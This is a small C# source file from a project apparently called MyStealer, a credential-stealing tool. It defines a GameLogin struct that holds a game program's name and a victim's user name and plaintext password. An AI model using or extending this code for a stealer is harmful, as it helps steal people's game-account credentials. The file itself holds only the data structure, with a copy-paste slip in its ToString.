using MyStealer.Collector.Modules.Client;

namespace MyStealer.Collector.Modules.Game
{
    public struct GameLogin
    {
        public string ProgramName { get; set; }
        public string Id { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }

        public override string ToString() => $"{nameof(ClientLogin)}({UserName}:{Password})";
    }
}
